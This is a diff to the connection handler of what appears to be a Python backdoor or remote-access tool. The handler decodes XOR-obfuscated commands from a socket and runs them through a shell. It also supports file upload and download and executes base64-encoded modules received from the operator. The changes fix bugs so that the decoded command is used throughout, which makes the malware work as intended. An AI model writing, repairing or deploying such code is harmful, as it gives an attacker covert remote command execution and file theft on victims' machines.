@@ -43,7 +43,7 @@ def handler(connection):
     time.sleep(2)     
                           
     while True:                                     
-        cmd = conn.recv(socksize)
+        cmd = connection.recv(socksize)
         cmd2 = xor(cmd, pin)
         proc = Popen(cmd2,
              shell=True,
@@ -53,8 +53,8 @@ def handler(connection):
              )
         stdout, stderr = proc.communicate()
 
-        if cmd.startswith(':upload'):
-            getname = cmd.split(" ")
+        if cmd2.startswith(':upload'):
+            getname = cmd2.split(" ")
             rem_file = getname[1]
             filename = rem_file.replace("/","_")
             filedata = connection.recv(socksize)
@@ -67,7 +67,7 @@ def handler(connection):
             if not os.path.isfile(filename):
                 connection.send(xor("[!] File upload failed! Please try again\n", pin))
 
-        elif cmd.startswith(':download'):
+        elif cmd2.startswith(':download'):
             getname = cmd2.split(" ")
             loc_file = getname[1]
             if os.path.exists(loc_file) is True:
@@ -79,8 +79,8 @@ def handler(connection):
             else:
                 connection.send(xor("[+] File not found!", pin))
     
-        elif cmd.startswith(':exec'):
-            getname = cmd.split(" ")        # split mod name from cmd
+        elif cmd2.startswith(':exec'):
+            getname = cmd2.split(" ")        # split mod name from cmd
             modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
     
             mod_data = ""                   # Our received file data will go here 
@@ -91,7 +91,7 @@ def handler(connection):
             modexec = b64decode(mod_data)   # decode the received file
             module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
 
-        elif cmd == ":quit":
+        elif cmd2 == ":quit":
             print("[!] Closing server!")
             conn.close()
             os._exit(0)
